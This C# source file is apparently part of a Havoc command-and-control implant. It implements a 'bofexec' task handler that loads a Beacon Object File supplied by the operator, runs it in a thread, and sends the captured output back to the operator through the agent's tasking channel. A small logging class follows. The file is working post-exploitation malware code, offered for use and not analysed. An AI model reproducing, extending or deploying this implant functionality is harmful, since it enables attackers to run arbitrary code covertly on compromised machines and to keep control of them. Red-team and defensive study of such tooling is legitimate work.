using HavocImplant.AgentFunctions.BofExec.Internals;
using System;
using System.Runtime.CompilerServices;
using System.Diagnostics;
using System.Text;
using System.Linq;
using System.Collections.Generic;

namespace HavocImplant.AgentFunctions.BofExec
{
    public class BofExec
    {
        private const int ERROR_INVALID_COMMAND_LINE = 0x667;

        public static void Run(Implant agent, string[] args, int taskId)
        {

            Logger.Info("Starting RunOF [x64]");
            string output = "";

#if DEBUG
            Logger.Level = Logger.LogLevels.DEBUG;
#endif

            ParsedArgs ParsedArgs;
            try
            {
                ParsedArgs = new ParsedArgs(args);

            } catch (ArgumentNullException)
            {
                output += "ArgumentNullException\n";
                //agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand}]\n" + output).Replace("\\", "\\\\").Replace("\"", "\\\""));
                //return 0;
                return;
            }
            catch (Exception e)
            {
                //Logger.Error($"Unable to parse application arguments: \n {e}");
                //return -1;
                output += $"Unable to parse application arguments: \n {e}\n";
                //agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand}]\n" + output).Replace("\\", "\\\\").Replace("\"", "\\\""));
                return;
            };


            Logger.Info($"Loading object file {ParsedArgs.filename}");

            try
            {
                BofRunner bof_runner = new BofRunner(ParsedArgs);
                //  bof_runner.LoadBof(filename);

                bof_runner.LoadBof();

                Logger.Info($"About to start BOF in new thread at {bof_runner.entry_point.ToInt64():X}");
                // We only want the press enter to start if a debug build and -v flag supplied, as we might want logs from a non-interactive session
#if DEBUG
                if (ParsedArgs.debug)
                {
                
                    Logger.Debug("Press enter to start it (✂️ attach debugger here...)");
                    Console.ReadLine();
            }
#endif


                var Result = bof_runner.RunBof(30);
                
                output += "------- BOF OUTPUT ------\n";
                output += $"{Result.Output}\n";
                output += "------- BOF OUTPUT FINISHED ------\n";
                // Console.WriteLine($"{output}");

                List<byte> filtering = Encoding.UTF8.GetBytes(output).ToList<byte>();
                int index = filtering.IndexOf(0x09);
                //Console.WriteLine($"Found tab at {index}");
                while (index >= 0)
                {
                    filtering[index] = 0x20;
                    filtering.InsertRange(index, new byte[] { 0x20, 0x20, 0x20 });
                    index = filtering.IndexOf(0x09);
                    //onsole.WriteLine($"Found tab at {index}");
                }
                output = Encoding.UTF8.GetString(filtering.ToArray());

                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [bofexec]\n" + output).Replace("\\", "\\\\").Replace("\"", "\\\""));
                return;
#if DEBUG
                if (ParsedArgs.debug)
                {
                    Logger.Debug("Press enter to continue...");
                    Console.ReadLine();
            }
#endif
                //Logger.Info("Thanks for playing!");

                // Use our thread exit code as our app exit code so we can check for errors easily
                //return Result.ExitCode;


            } catch (Exception e)
            {
                Logger.Error($"Error! {e}");
                //return -1;
                //agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand}]\n" + e).Replace("\\", "\\\\").Replace("\"", "\\\""));
                return;
            }

        }

       
    }
    //uncomment the Console.WriteLine for debug
    public static class Logger
    {
        public enum LogLevels
        {
            ERROR,
            INFO,
            DEBUG
        }

        public static LogLevels Level { get; set; } = LogLevels.INFO;


        static Logger()
        {

        }

        public static void Debug(string Message, [CallerMemberName] string caller = "")
        {
            var methodInfo = new StackTrace().GetFrame(1).GetMethod();
            var className = methodInfo.ReflectedType.Name;
            //if (Level >= LogLevels.DEBUG) 
                Console.WriteLine($"[=] [{className}:{methodInfo}] {Message}");
        }

        public static void Info(string Message)
        {
            //if (Level >= LogLevels.INFO) 
                Console.WriteLine($"[*] {Message}");
        }

        public static void Error(string Message)
        {
            //if (Level >= LogLevels.ERROR) 
                Console.WriteLine($"[!!] {Message}");
        }
    }
}
